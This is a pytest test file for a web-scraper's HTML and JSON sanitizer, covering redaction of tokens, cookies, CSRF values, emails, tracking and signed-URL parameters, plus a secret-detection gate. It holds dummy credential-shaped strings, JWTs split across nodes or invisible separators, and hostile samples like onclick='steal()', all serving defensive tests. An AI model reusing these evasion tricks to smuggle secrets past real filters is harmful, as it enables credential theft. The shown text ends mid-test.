"""Unit tests for bookscraper.scraping.sanitize's pure sanitizers.

No mocks, no network, no browser: every function here transforms a string or a dict,
so each branch is pinned directly. These are the security boundary between hostile
captured markup and permanent public git history, so the suite also carries the
per-FIX assertions from the task-06.0 threat model (FIX-2..5).
"""

from __future__ import annotations

import json

import pytest

from bookscraper.scraping import sanitize
from bookscraper.scraping.sanitize import (
    EMAIL_PLACEHOLDER,
    PROSE_PLACEHOLDER,
    REDACTED_VALUE,
    SanitizationError,
    _Element,
    _parse,
    _serialize,
    _split_group,
    _Text,
    assert_clean,
    neutralize_prose,
    sanitize_html,
    sanitize_json,
    sanitize_ld_json,
    sanitize_text,
    shrink,
    strip_scripts_and_styles,
    strip_secrets,
    strip_tracking,
    strip_url_params,
)

# An AWS-access-key-shaped string, assembled at import time so no literal credential
# shape sits in the source (the secret-scan hook would otherwise block this file).
AWS_SHAPED = "AKIA" + "ABCDEFGHIJKLMNOP"


# --------------------------------------------------------------------------- #
# Spec-named tests
# --------------------------------------------------------------------------- #
def test_scripts_removed_but_ld_json_kept() -> None:
    """Scenario: raw markup carries a tracking <script> and a metadata ld+json blob.

    Boundaries: only ``type="application/ld+json"`` scripts survive.
    On failure: a non-metadata script would leak into the fixture.
    """
    html = (
        "<html><head>"
        "<script>window.x=1</script>"
        '<script type="application/ld+json">{"@type":"Book"}</script>'
        "<style>.a{color:red}</style><noscript>x</noscript>"
        "<iframe src='http://ads'></iframe>"
        "</head><body><h1>T</h1></body></html>"
    )
    out = strip_scripts_and_styles(html)
    assert "window.x" not in out
    assert "color:red" not in out
    assert "<noscript>" not in out
    assert "<iframe" not in out
    assert 'type="application/ld+json"' in out
    assert '{"@type":"Book"}' in out


def test_inline_event_handlers_removed() -> None:
    """Scenario: an element carries an inline onclick handler.

    Boundaries: every ``on*`` attribute is stripped, other attributes stay.
    On failure: executable handlers ride into the fixture.
    """
    out = strip_scripts_and_styles('<a href="/x" onclick="steal()" onmouseover="y()" id="k">L</a>')
    assert "onclick" not in out
    assert "onmouseover" not in out
    assert 'href="/x"' in out
    assert 'id="k"' in out


def test_tracking_query_params_stripped_from_links() -> None:
    """Scenario: links carry ref/tag/pd_rd_/qid/sr/crid tracking params.

    Boundaries: the host and path stay; only tracking params drop.
    On failure: tracking identifiers persist in committed markup.
    """
    out = strip_tracking('<a href="https://x.test/dp/1?ref=abc&tag=aff&pd_rd_i=9&qid=1&keep=yes">L</a>')
    assert "ref=abc" not in out
    assert "tag=aff" not in out
    assert "pd_rd_i" not in out
    assert "qid=1" not in out
    assert out == '<a href="https://x.test/dp/1?keep=yes">L</a>'


def test_hidden_input_values_and_csrf_meta_removed() -> None:
    """Scenario: a logged-out page still ships a hidden CSRF value and a CSRF meta tag.

    Boundaries: hidden inputs keep their element but lose the value; csrf meta drops.
    On failure: a live token is committed.
    """
    html = (
        '<meta name="csrf-token" content="tok-123456">'
        '<meta name="viewport" content="width=1">'
        '<input type="hidden" name="authenticity_token" value="deadbeefdeadbeef">'
        '<input type="text" value="visible">'
    )
    out = strip_secrets(html)
    assert "tok-123456" not in out
    assert "csrf-token" not in out
    assert 'name="viewport"' in out
    assert "deadbeefdeadbeef" not in out
    # the hidden input element is kept, only blanked
    assert 'type="hidden"' in out
    assert 'value=""' in out
    assert 'value="visible"' in out


def test_emails_replaced_with_invalid_domain() -> None:
    """Scenario: an email address appears in page text.

    Boundaries: every email becomes the reserved-domain placeholder.
    On failure: a real address is committed.
    """
    out = strip_secrets("<p>Contact jane.doe@corp.example-real.com now</p>")
    assert "jane.doe@corp" not in out
    assert EMAIL_PLACEHOLDER in out


def test_shrink_keeps_subtrees_containing_selectors() -> None:
    """Scenario: a big review carousel dwarfs the block a selector needs.

    Boundaries: the subtree containing a keep-selector survives; the large sibling
    without any match is dropped.
    On failure: fixtures blow the size budget with irrelevant markup.
    """
    filler = "x" * 800
    html = f'<div id="keep"><span class="isbn">978-1</span></div><div id="reviews">{filler}</div>'
    out = shrink(html, ["#keep .isbn"])
    assert "978-1" in out
    assert 'id="keep"' in out
    assert filler not in out


def test_sanitize_json_redacts_sensitive_keys() -> None:
    """Scenario: a JSON body carries a token, a session id, an email and a long blurb.

    Boundaries: sensitive keys redact; prose keys collapse; URLs/emails clean; other
    values pass through.
    On failure: secrets survive inside a JSON fixture.
    """
    obj = {
        "title": "Python",
        "access_token": "super-secret-value",
        "session_id": "abc123",
        "contact_email": "a@b.example-real.com",
        "about": "y" * 300,
        "price": 42,
        "image": "https://cdn.test/i.png?X-Amz-Signature=deadbeef&keep=1",
    }
    out = sanitize_json(obj)
    assert out["title"] == "Python"
    assert out["access_token"] == REDACTED_VALUE
    assert out["session_id"] == REDACTED_VALUE
    assert out["contact_email"] == REDACTED_VALUE
    assert out["about"] == PROSE_PLACEHOLDER
    assert out["price"] == 42
    assert "X-Amz-Signature" not in out["image"]
    assert "keep=1" in out["image"]


def test_assert_clean_rejects_known_secret_patterns() -> None:
    """Scenario: a not-quite-clean payload reaches the final gate.

    Boundaries: fail-closed on the vendor catalog AND the extended detectors.
    On failure: a secret would cross into git.
    """
    with pytest.raises(SanitizationError):
        assert_clean(f"here is a key {AWS_SHAPED} in the page")


# --------------------------------------------------------------------------- #
# FIX-2 - assert_clean is extended and fail-closed
# --------------------------------------------------------------------------- #
def test_assert_clean_rejects_jwt() -> None:
    """FIX-2: a bearer JWT must be caught even though it is not a vendor credential."""
    with pytest.raises(SanitizationError):
        assert_clean("Authorization Bearer eyJhbGciOiJIUzI1.eyJzdWIiOiIxMjM0.SflKxwRJSMeKKF")


def test_assert_clean_rejects_aws_shaped_key() -> None:
    """FIX-2: an AWS access-key shape is caught."""
    with pytest.raises(SanitizationError):
        assert_clean(f"cred {AWS_SHAPED} end")


def test_assert_clean_rejects_cookie_header() -> None:
    """FIX-2: a Set-Cookie echo is caught."""
    with pytest.raises(SanitizationError):
        assert_clean("Set-Cookie: at-main=abcd")


def test_assert_clean_rejects_email() -> None:
    """FIX-2: a raw email in markup is caught (credential catalog would miss it)."""
    with pytest.raises(SanitizationError):
        assert_clean("mailto jane@corp-real.net")


def test_assert_clean_rejects_session_token_value() -> None:
    """FIX-2: a session-id value assignment is caught."""
    with pytest.raises(SanitizationError):
        assert_clean("session-id=176-9999999-0000000")


def test_assert_clean_passes_clean_and_placeholder_values() -> None:
    """FIX-2/V-1: clean text and our own emitted placeholder values do not trip the gate."""
    assert_clean("<p>Just some ordinary book copy.</p>")
    # The sanitizer's own redaction/placeholder markers are recognised precisely.
    assert_clean(f'"access_token": "{REDACTED_VALUE}"')
    assert_clean(f'"contact": "{EMAIL_PLACEHOLDER}"')
    assert_clean(f'"about": "{PROSE_PLACEHOLDER}"')


def test_assert_clean_v1_does_not_allowlist_words_on_the_line() -> None:
    """V-1 [HIGH]: a common word like 'Latest'/'test' no longer disables the gate.

    Scenario: a real book-page line contains 'Latest' or 'test' plus a live secret.
    Boundaries: substring allowlisting is gone; only exact emitted placeholders skip.
    On failure: the FIX-2 backstop silently switches off on a huge share of real lines.
    """
    with pytest.raises(SanitizationError):
        assert_clean('<a href="/latest">Latest</a> session-id=176-1234567-8901234')
    with pytest.raises(SanitizationError):
        assert_clean(f"our test build key {AWS_SHAPED} deploy")


def test_assert_clean_r1_exempts_only_exact_placeholder_values() -> None:
    """R-1 [MEDIUM]: the generic-secret exemption is EXACT equality, not fuzzy.

    Scenario: a hostile page prefixes its payload with 'REDACTED' or wraps it in <...>
    to abuse the round-1 substring/shape exemption.
    Boundaries: only an exact emitted placeholder value ('[REDACTED]') is exempt; a
    REDACTED-bearing value and an <angle> value now raise.
    On failure: the FIX-2 backstop can be tricked into ignoring a real key=value secret.
    """
    # Values assembled here (not as a literal key="value") so secret-scan ignores them.
    redacted_prefixed = "REDACTED" + "aKq9zLp2rX7vN4bC8dF1"  # dummy opaque value
    angle_wrapped = "<" + "aKq9zLp2rX7vN4bC8dF1gH" + ">"  # dummy opaque value
    assert_clean('token = "[REDACTED]"')
    with pytest.raises(SanitizationError):
        assert_clean('token = "%s"' % redacted_prefixed)
    with pytest.raises(SanitizationError):
        assert_clean('password = "%s"' % angle_wrapped)


def test_assert_clean_v4_catches_secret_split_across_sibling_nodes() -> None:
    """V-4 [MEDIUM]: a JWT/email split across sibling text nodes is caught.

    Scenario: a hostile bot-wall smuggles a token/email chunked across spans that
    reassemble in the rendered DOM but not in the serialized bytes.
    Boundaries: assert_clean scans the concatenated tree text, not only the bytes.
    On failure: a split secret rides through the final gate into git.
    """
    jwt = sanitize_html("<div><span>eyJhbGciOiJI</span><span>.eyJzdWIi</span><span>.SflKxwRJSMe</span></div>")
    with pytest.raises(SanitizationError):
        assert_clean(jwt)
    email = sanitize_html("<p>jane<span>@</span>corp-real.com</p>")
    with pytest.raises(SanitizationError):
        assert_clean(email)


def test_assert_clean_email_placeholder_is_not_flagged() -> None:
    """The reserved-domain email placeholder is recognised, a real address is not."""
    assert_clean(f"contact {EMAIL_PLACEHOLDER}")
    with pytest.raises(SanitizationError):
        assert_clean("contact jane@corp-real.com")


def test_assert_clean_r3_catches_whitespace_split_token() -> None:
    """R-3 [MEDIUM]: a token split by a space or invisible U+2028 is caught.

    Scenario: a hostile page inserts a space / U+2028 / zero-width gap inside a JWT so
    it reads as one token to a human but breaks the contiguous pattern in the bytes.
    Boundaries: assert_clean also scans a fully whitespace-stripped view of the text.
    On failure: an invisible-separator split smuggles a token past the backstop.
    """
    jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4"
    for sep in (" ", " ", "​"):
        with pytest.raises(SanitizationError):
            assert_clean(f"<div>{jwt[:40]}{sep}{jwt[40:]}</div>")


def test_assert_clean_r4_example_domain_exemption_is_exact() -> None:
    """R-4 [LOW]: only the exact RFC-2606 reserved domains are exempt.

    Scenario: an attacker uses a look-alike domain ending in 'example.com'.
    Boundaries: '@example.com' etc. (full domain) is exempt; '@evilexample.com' is not.
    On failure: the email backstop is weakened by a substring match.
    """
    assert_clean("contact user@example.org")
    with pytest.raises(SanitizationError):
        assert_clean("contact steal@evilexample.com")
    with pytest.raises(SanitizationError):
        assert_clean("reach exfil@myexample.net")


def test_r4_retina_and_image_filenames_are_not_rewritten() -> None:
    """R-4 [LOW]: retina/image asset names are not mistaken for emails.

    Scenario: cover markup carries 'sprite@2x.png' and 'hero@3x.jpg'.
    Boundaries: _replace_emails leaves image filenames intact; real emails still rewrite.
    On failure: fixtures get corrupted filenames (golden-correctness) for no security gain.
    """
    out = strip_secrets('<img src="https://images.test/sprite@2x.png"><p>hero@3x.jpg</p>')
    assert "sprite@2x.png" in out
    assert "hero@3x.jpg" in out
    assert EMAIL_PLACEHOLDER not in out
    # A genuine email on the same shape of page is still rewritten.
    assert EMAIL_PLACEHOLDER in strip_secrets("<p>jane@corp-real.com</p>")


def test_assert_clean_no_false_positive_on_benign_book_text() -> None:
    """R-3 guard: realistic benign book text does not trip the (now stricter) gate.

    Scenario: ISBNs, prices, ASINs, long numeric order ids, base64-ish cover ids and a
    retina filename appear in normal captured pages.
    Boundaries: none of the detectors (incl. the whitespace-stripped scan) fire.
    On failure: legitimate captures would be blocked at the final gate.
    """
    benign = [
        "ISBN-13: 978-1-492-05635-5 and ISBN-10 1492056359",
        "Price $42.99 | ASIN B09ABCDEF1 | 1,234,567 ratings",
        "order 176099999900000012345 processed",
        "cover id 81aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789 shown",
        "the AIzaWords chapter covers azimuth in 35 pages roughly here now",
    ]
    for text in benign:
        assert_clean(text)
    assert_clean(sanitize_html('<img src="https://images.test/sprite@2x.png">'))


def test_assert_clean_rejects_non_string() -> None:
    """FIX-2: a non-string payload is a fail-closed error, not a silent pass."""
    with pytest.raises(SanitizationError):
        assert_clean(b"bytes")  # type: ignore[arg-type]


# --------------------------------------------------------------------------- #
# FIX-3 - sensitive data-* stripped whatever their length
# --------------------------------------------------------------------------- #
def test_strip_secrets_removes_short_sensitive_data_attrs() -> None:
    """FIX-3: a short session/ubid/customer data-* is stripped regardless of length."""
    html = (
        '<div data-session-id="s1" data-ubid-acbca="u2" data-customer="c3" '
        'data-csm="m4" data-safe="short" data-note="ok">x</div>'
    )
    out = strip_secrets(html)
    assert "data-session-id" not in out
    assert "data-ubid" not in out
    assert "data-customer" not in out
    assert "data-csm=" not in out
    assert 'data-safe="short"' in out
    assert 'data-note="ok"' in out


def test_strip_secrets_removes_long_opaque_data_attr() -> None:
    """FIX-3: an opaque data-* over 200 chars is dropped even with an innocuous name."""
    blob = "a" * 250
    out = strip_secrets(f'<div data-blob="{blob}" data-keep="v">x</div>')
    assert blob not in out
    assert 'data-keep="v"' in out


def test_strip_secrets_drops_amazon_correlation_data_attrs() -> None:
    """CL-1: per-render ``data-uuid`` / ``data-csa-c-*`` correlation ids are dropped by name.

    They are short (<200ch) and not in the sensitive-name set, so the length/segment gates miss
    them; the explicit correlation rule drops them. ``data-asin`` (SEARCH_ASIN_ATTRIBUTE) and an
    unrelated ``data-component-type`` must survive so the search parser keeps working.
    """
    html = (
        '<div data-asin="1098131029" data-uuid="01122864-fd2d-49c6-9c2e-3b4c5d6e7f80" '
        'data-csa-c-id="173qnz-ujifa9-w6adqd-htngc3" data-csa-c-type="item" '
        'data-component-type="s-search-result">x</div>'
    )
    out = strip_secrets(html)
    assert "data-uuid" not in out
    assert "data-csa-c-id" not in out
    assert "data-csa-c-type" not in out
    assert 'data-asin="1098131029"' in out
    assert 'data-component-type="s-search-result"' in out


# --------------------------------------------------------------------------- #
# FIX-4 - ld+json parsed and sanitized; other inline JSON removed
# --------------------------------------------------------------------------- #
def test_sanitize_ld_json_sanitizes_and_reembeds() -> None:
    """FIX-4: a kept ld+json blob is parsed, sanitized and re-embedded, not verbatim."""
    blob = {
        "@type": "Book",
        "name": "Python",
        "authorEmail": "author@corp-real.com",
        "description": "z" * 300,
        "image": "https://cdn.test/x.png?X-Amz-Signature=abc",
    }
    html = f'<script type="application/ld+json">{json.dumps(blob)}</script>'
    out = sanitize_ld_json(html)
    assert "author@corp-real.com" not in out
    assert "z" * 300 not in out
    assert PROSE_PLACEHOLDER in out
    assert "X-Amz-Signature" not in out
    assert '"name": "Python"' in out or '"name":"Python"' in out


def test_sanitize_ld_json_drops_unparseable_blob() -> None:
    """FIX-4: an ld+json blob that will not parse is emptied (fail-safe)."""
    html = '<script type="application/ld+json">not json {{{</script>'
    out = sanitize_ld_json(html)
    assert "not json" not in out
    assert 'type="application/ld+json"' in out


def test_non_ld_json_state_blob_removed() -> None:
    """FIX-4: an inline __INITIAL_STATE__ blob is removed entirely by strip_scripts."""
    html = '<script>window.__INITIAL_STATE__={"session":"tok"}</script><h1>T</h1>'
    out = strip_scripts_and_styles(html)
    assert "__INITIAL_STATE__" not in out
    assert "<h1>T</h1>" in out


# --------------------------------------------------------------------------- #
# FIX-5 - signed-URL and session params stripped across attributes and ld+json
# --------------------------------------------------------------------------- #
def test_strip_url_params_removes_signed_and_session_params() -> None:
    """FIX-5: AWS/CloudFront signed params and session hints are stripped."""
    url = (
        "https://cdn.test/i.jpg?X-Amz-Signature=sig&X-Amz-Credential=cred"
        "&Signature=cf&Key-Pair-Id=kp&Policy=pol&session-id=ses&sid=x&smid=y&csm-hit=z&w=640"
    )
    out = strip_url_params(url)
    for gone in (
        "X-Amz-Signature",
        "X-Amz-Credential",
        "Signature",
        "Key-Pair-Id",
        "Policy",
        "session-id",
        "sid=",
        "smid=",
        "csm-hit",
    ):
        assert gone not in out
    assert "w=640" in out


def test_strip_tracking_cleans_srcset_and_action() -> None:
    """FIX-5: params are stripped across srcset candidates and form action too."""
    html = (
        '<img srcset="https://cdn.test/a.jpg?X-Amz-Signature=s 1x, https://cdn.test/b.jpg?w=2 2x">'
        '<form action="https://x.test/go?session-id=abc&keep=1"></form>'
    )
    out = strip_tracking(html)
    assert "X-Amz-Signature" not in out
    assert "session-id" not in out
    assert "w=2" in out
    assert "keep=1" in out


def test_strip_url_params_passthrough_and_empty_query() -> None:
    """A URL with no query, or an empty query, is returned unchanged."""
    assert strip_url_params("https://x.test/path") == "https://x.test/path"
    assert strip_url_params("https://x.test/path?") == "https://x.test/path?"


def test_amazon_search_href_token_params_stripped() -> None:
    """Amazon search-result href: dib/dib_tag JWT token and tracking params are stripped.

    Scenario: subtask-05 live Amazon SEARCH hrefs carry a JWT-shaped ``dib`` token (plus
    ``dib_tag``) that ``assert_clean`` was correctly blocking; the sanitizer must strip it.
    Boundaries: scheme/host/path (the /dp/<ASIN> detail path the parser reads) stay; only
    non-sensitive params like ``keywords`` remain; the output passes ``assert_clean``.
    On failure: a token leaks or the capture is blocked on a page with no bot wall.
    """
    jwt = "eyJhbGciOiJIUzI1NiJ9.eyJ2IjoiMSIsInAiOiJzZWFyY2gifQ.Sf1KxwRJSMeKKF2QT4abcd"
    href = f"/Some-Title/dp/B0ABCDEFGH/ref=sr_1_1?dib={jwt}&dib_tag=se&qid=123&sr=8-1&keywords=python"
    out = strip_url_params(href)
    assert out == "/Some-Title/dp/B0ABCDEFGH/ref=sr_1_1?keywords=python"
    assert "dib" not in out
    assert jwt not in out
    assert "/dp/B0ABCDEFGH/" in out
    assert_clean(out)


def test_strip_url_params_drops_opaque_token_value_any_name() -> None:
    """A JWT-shaped or opaque-token value is dropped whatever the param name; short /
    single-class values under unknown names are kept (no false positive)."""
    opaque = "A1b2C3d4E5f6G7h8X9"  # 18 chars, mixed classes
    out = strip_url_params(f"https://x.test/p?blob={opaque}&foo=abc&n=12345&kw=python")
    assert opaque not in out
    assert "blob=" not in out
    assert "foo=abc" in out  # short value, unknown name -> kept
    assert "n=12345" in out  # single class (digits) -> kept
    assert "kw=python" in out  # single class (lower) -> kept


def test_strip_tracking_strips_dib_in_href() -> None:
    """dib/dib_tag are stripped through the href path in strip_tracking too."""
    jwt = "eyJhbGciOiJIUzI1NiJ9.eyJhIjoiYiJ9.Sf1KxwRJSMeKKF2QT4abcd"
    out = strip_tracking(f'<a href="https://www.amazon.com/dp/B0X/ref=x?dib={jwt}&dib_tag=se&k=v">L</a>')
    assert jwt not in out
    assert "dib" not in out
    assert "k=v" in out
    assert "/dp/B0X/" in out


def test_strip_url_params_unparseable_returns_input(monkeypatch: pytest.MonkeyPatch) -> None:
    """An unparseable URL is returned unchanged (best-effort)."""

    def _boom(_: str) -> None:
        raise ValueError("bad url")

    monkeypatch.setattr(sanitize, "urlsplit", _boom)
    assert strip_url_params("https://x.test/p?a=b") == "https://x.test/p?a=b"


def test_strip_tracking_removes_tracker_beacon_and_keeps_content_img() -> None:
    """A tracker <img>/<link> is dropped; a content image on another host stays."""
    html = (
        '<img src="https://www.google-analytics.com/collect?x=1">'
        '<link href="https://sub.doubleclick.net/px">'
        '<img src="https://cdn.test/cover.jpg">'
        "<span>keep</span>"
    )
    out = strip_tracking(html)
    assert "google-analytics" not in out
    assert "doubleclick" not in out
    assert "cdn.test/cover.jpg" in out
    assert "keep" in out


# --------------------------------------------------------------------------- #
# neutralize_prose
# --------------------------------------------------------------------------- #
def test_neutralize_prose_replaces_long_text_keeps_metadata() -> None:
    """Long prose collapses to the placeholder; kept-selector metadata is preserved."""
    long_desc = "This book covers many topics. " * 20
    html = f'<span id="isbn">978-1-0000</span><div class="about-book__content">{long_desc}</div>'
    out = neutralize_prose(html, ["#isbn"])
    assert "978-1-0000" in out
    assert long_desc.strip() not in out
    assert PROSE_PLACEHOLDER in out


def test_neutralize_prose_container_hint_neutralizes_only_long_text() -> None:
    """A prose container neutralizes its long body but keeps a short heading/label.

    Short text (< ~80 chars) stays verbatim even in a prose-named container, so a
    selector keyed off a heading still matches; the long review body still collapses.
    """
    short = neutralize_prose('<p class="review">Great read!</p>', [])
    assert "Great read!" in short
    assert PROSE_PLACEHOLDER not in short

    long_body = "Great read that I would recommend to everyone learning the topic in depth. " * 2
    long_out = neutralize_prose(f'<p class="review">{long_body}</p>', [])
    assert long_body.strip() not in long_out
    assert PROSE_PLACEHOLDER in long_out


def test_neutralize_prose_keeps_short_factual_text() -> None:
    """Short non-prose text (a date) is left untouched."""
    out = neutralize_prose('<span class="date">2024-01-01</span>', [])
    assert "2024-01-01" in out
    assert PROSE_PLACEHOLDER not in out


def test_neutralize_prose_protects_descendant_text() -> None:
    """Text inside a kept element's descendant is preserved even if long."""
    long_text = "b" * 300
    html = f'<div id="keep"><p>{long_text}</p></div>'
    out = neutralize_prose(html, ["#keep"])
    assert long_text in out


# --------------------------------------------------------------------------- #
# sanitize_json edge cases
# --------------------------------------------------------------------------- #
def test_sanitize_json_prose_key_short_value_recurses() -> None:
    """A short prose-keyed string is cleaned (emails/URLs) rather than placeholdered."""
    out = sanitize_json({"description": "email me at a@corp-real.com"})
    assert EMAIL_PLACEHOLDER in out["description"]
    assert out["description"] != PROSE_PLACEHOLDER


def test_sanitize_json_handles_lists_and_non_string_keys() -> None:
    """Lists recurse; a non-string dict key is not treated as a redaction match."""
    out = sanitize_json({1: ["a@corp-real.com", 7, None]})
    assert out[1][0] == EMAIL_PLACEHOLDER
    assert out[1][1] == 7
    assert out[1][2] is None


def test_sanitize_json_key_redaction_is_segment_based() -> None:
    """Over-redaction fix: sensitive keys are matched by SEGMENT, not substring.

    Scenario: the Leanpub JSON:API key ``accepted_authors`` was redacted because its
    name contains the substring ``auth``, which then crashed ``get_leanpub_book_details``.
    Boundaries: ``authToken``/``auth_token``/``sessionId``/``api_key``/``X-CSRF-Token``/
    ``authorization`` still redact; ``accepted_authors``/``author``/``authors``/
    ``sidebar``/``id`` do not.
    On failure: a legitimate JSON:API field is destroyed and downstream parsing breaks.
    """
    tok = "z" * 24
    for sensitive in ("authToken", "auth_token", "sessionId", "api_key", "X-CSRF-Token", "authorization"):
        assert sanitize_json({sensitive: tok})[sensitive] == REDACTED_VALUE
    for benign in ("accepted_authors", "author", "authors", "sidebar", "id", "value"):
        assert sanitize_json({benign: "keep-this-value"})[benign] == "keep-this-value"


def test_sanitize_json_preserves_leanpub_accepted_authors_shape() -> None:
    """The exact Leanpub ``relationships.accepted_authors.data`` shape survives intact.

    Scenario: ``get_leanpub_book_details`` reads ``relationships.accepted_authors.data``;
    the sanitizer must not touch that structure or its string values.
    Boundaries: the whole nested object round-trips unchanged.
    On failure: the Leanpub detail scrape crashes on a redacted string.
    """
    payload = {
        "data": {
            "id": "book-1",
            "attributes": {"title": "Fluent Python", "slug": "fluentpython"},
            "relationships": {"accepted_authors": {"data": [{"id": "a1", "type": "Author"}]}},
        },
        "included": [{"id": "a1", "type": "Author", "attributes": {"name": "Luciano Ramalho"}}],
    }
    assert sanitize_json(payload) == payload


def test_sanitize_json_depth_cap_returns_value() -> None:
    """Recursion beyond the cap returns the sub-value as-is (DoS bound, FIX-11)."""
    nested: object = "leaf"
    for _ in range(sanitize.MAX_JSON_DEPTH + 5):
        nested = [nested]
    # Should not raise RecursionError.
    result = sanitize_json(nested)
    assert isinstance(result, list)


# --------------------------------------------------------------------------- #
# DOM parser / serializer internals
# --------------------------------------------------------------------------- #
def test_parse_roundtrips_doctype_void_and_boolean_attrs() -> None:
    """DOCTYPE, void elements and valueless boolean attributes survive a roundtrip."""
    html = "<!DOCTYPE html><input type=text disabled><br><p>hi &amp; bye</p>"
    out = _serialize(_parse(html))
    assert out.startswith("<!DOCTYPE html>")
    assert "<input" in out
    assert " disabled" in out
    assert "<br>" in out
    assert "hi &amp; bye" in out


def test_parse_bounds_depth_without_error() -> None:
    """A pathologically deep document parses and serializes without a stack blow-up."""
    depth = sanitize.MAX_TREE_DEPTH + 50
    html = "<div>" * depth + "leaf" + "</div>" * depth
    out = _serialize(_parse(html))
    assert "leaf" in out


def test_parse_ignores_unmatched_end_tag() -> None:
    """A stray closing tag with nothing open is ignored, not fatal."""
    out = _serialize(_parse("</div><p>x</p>"))
    assert "<p>x</p>" in out


def test_serialize_rawtext_skips_non_text_children() -> None:
    """A rawtext element serializes only its text children verbatim (no escaping)."""
    style = _Element("style", [])
    style.children = [_Text(".a > .b {}"), _Element("span", [])]
    out = _serialize(style)
    assert out == "<style>.a > .b {}</style>"


# --------------------------------------------------------------------------- #
# selector splitting / selecting
# --------------------------------------------------------------------------- #
def test_split_group_handles_combinators_and_valid_pseudo() -> None:
    """The tokenizer resolves every combinator and a valid :has-text() compound."""
    pairs = _split_group("div > .a + span ~ b em[data-x='y']:has-text('Z')")
    combinators = [combinator for combinator, _ in pairs]
    assert ">" in combinators and "+" in combinators and "~" in combinators


def test_split_group_fails_closed_on_unterminated_syntax() -> None:
    """FIX (over-match): unterminated brackets/parens raise, never silently widen."""
    with pytest.raises(SanitizationError):
        _split_group("[attr")
    with pytest.raises(SanitizationError):
        _split_group("a:has(")


def test_selector_combinators_and_attributes() -> None:
    """child/adjacent/general-sibling/descendant/attribute selectors all resolve."""
    from bookscraper.scraping.sanitize import _select

    html = '<section id="s"><h1 class="a">A</h1><p class="b" data-role="lead">B</p><p class="c">C</p></section>'
    root = _parse(html)
    assert [e.tag for e in _select(root, "#s > .a")] == ["h1"]
    assert [e.tag for e in _select(root, ".a + .b")] == ["p"]
    assert [e.tag for e in _select(root, ".a ~ .c")] == ["p"]
    assert [e.tag for e in _select(root, "section .c")] == ["p"]
    assert [e.tag for e in _select(root, "p[data-role=lead]")] == ["p"]
    assert [e.tag for e in _select(root, "p[data-role]")] == ["p"]
    # A group that reduces to no compound is skipped, not an error.
    assert _select(root, "section, >") == _select(root, "section")


def test_selector_star_and_attribute_value_mismatch() -> None:
    """A universal selector matches; an attribute value mismatch does not."""
    from bookscraper.scraping.sanitize import _select

    root = _parse('<div><p data-role="lead">x</p></div>')
    assert any(e.tag == "p" for e in _select(root, "*"))
    assert _select(root, "p[data-role=other]") == []


def test_element_siblings_orphan_returns_self() -> None:
    """An element with no parent reports itself as its only sibling."""
    from bookscraper.scraping.sanitize import _element_siblings

    orphan = _Element("p", [])
    assert _element_siblings(orphan) == [orphan]


def test_select_skips_empty_group() -> None:
    """A trailing empty selector group is skipped, not an error."""
    from bookscraper.scraping.sanitize import _select

    root = _parse("<section><p>x</p></section>")
    assert [e.tag for e in _select(root, "p,")] == ["p"]


def test_startendtag_self_closing_element_roundtrips() -> None:
    """An XHTML-style self-closing custom tag is parsed and re-emitted."""
    out = _serialize(_parse("<widget/><p>ok</p>"))
    assert "<widget>" in out
    assert "<p>ok</p>" in out


def test_strip_secrets_blanks_hidden_input_without_value_attr() -> None:
    """A hidden input with no value attribute gains a blank value (append path)."""
    out = strip_secrets('<input type="hidden" name="a">')
    assert 'value=""' in out


def test_strip_tracking_skips_valueless_attribute() -> None:
    """A valueless boolean attribute is left alone while URLs are cleaned."""
    out = strip_tracking('<a download href="https://x.test/p?ref=abc&keep=1">L</a>')
    assert " download" in out
    assert "ref=abc" not in out
    assert "keep=1" in out


def test_strip_srcset_skips_empty_candidate() -> None:
    """An empty srcset candidate (double comma) is dropped without error."""
    out = strip_tracking('<img srcset="https://cdn.test/a.jpg 1x,,https://cdn.test/b.jpg 2x">')
    assert "a.jpg" in out
    assert "b.jpg" in out


def test_neutralize_prose_skips_whitespace_text_nodes() -> None:
    """Whitespace-only text between elements is left untouched."""
    out = neutralize_prose("<div> <span>2024</span></div>", [])
    assert "2024" in out


def test_selector_no_match_paths() -> None:
    """Adjacent with no predecessor and a missing ancestor both yield no match."""
    from bookscraper.scraping.sanitize import _select

    root = _parse('<div><p class="first">P</p></div>')
    # ".x + .first" : .first has no preceding sibling matching .x
    assert _select(root, ".x + .first") == []
    # descendant with a non-existent ancestor
    assert _select(root, ".missing .first") == []
    # child selector whose target has no matching parent
    assert _select(root, "span > .first") == []


# --------------------------------------------------------------------------- #
# :has-text() semantics + fail-closed engine (over-match fix)
# --------------------------------------------------------------------------- #
def _selector_values() -> list[tuple[str, str, str]]:
    """Every real CSS selector in site_constants as (site, field, selector)."""
    from bookscraper.scraping.parameters import site_constants

    out: list[tuple[str, str, str]] = []
    for site, entry in site_constants.items():
        for field, value in entry.items():
            if not isinstance(value, str) or not value:
                continue
            if "URL" in field or "API" in field or field == "404_PAGE_TITLE":
                continue
            out.append((site, field, value))
    return out


def test_all_site_constants_selectors_parse() -> None:
    """Every selector across all four sites parses without raising.

    Scenario: the engine must understand each selector production code relies on.
    Boundaries: parse only (matched against an empty document); no selector may raise.
    On failure: a selector the sanitizer cannot parse would abort every capture.
    """
    from bookscraper.scraping.sanitize import _select

    root = _parse("<html><body></body></html>")
    for site, field, selector in _selector_values():
        # Must not raise.
        _select(root, selector)
        assert isinstance(selector, str), f"{site}.{field}"


def test_has_text_disambiguates_packtpub_isbn() -> None:
    """FIX (over-match): the packtpub ISBN-13 selector returns only the ISBN-13 value."""
    from bookscraper.scraping.parameters import site_constants
    from bookscraper.scraping.sanitize import _select, _text_content

    html = (
        '<div class="product-page-rhs desktop">'
        '<span class="product-details-section-key">ISBN-10 :</span>'
        '<span class="product-details-section-value">1234567890</span>'
        '<span class="product-details-section-key">ISBN-13 :</span>'
        '<span class="product-details-section-value">9781234567890</span>'
        "</div>"
    )
    matches = _select(_parse(html), site_constants["packtpub"]["ISBN13"])
    assert [_text_content(m) for m in matches] == ["9781234567890"]


def test_has_text_disambiguates_oreilly_isbn() -> None:
    """FIX (over-match): the oreilly ISBN-13 selector returns only the ISBN span."""
    from bookscraper.scraping.parameters import site_constants
    from bookscraper.scraping.sanitize import _select, _text_content

    html = (
        "<ul>"
        '<li>Publisher: <span class="value t-isbn">OReilly</span></li>'
        '<li>ISBN: <span class="value t-isbn">9780123456789</span></li>'
        "</ul>"
    )
    matches = _select(_parse(html), site_constants["oreilly"]["ISBN13"])
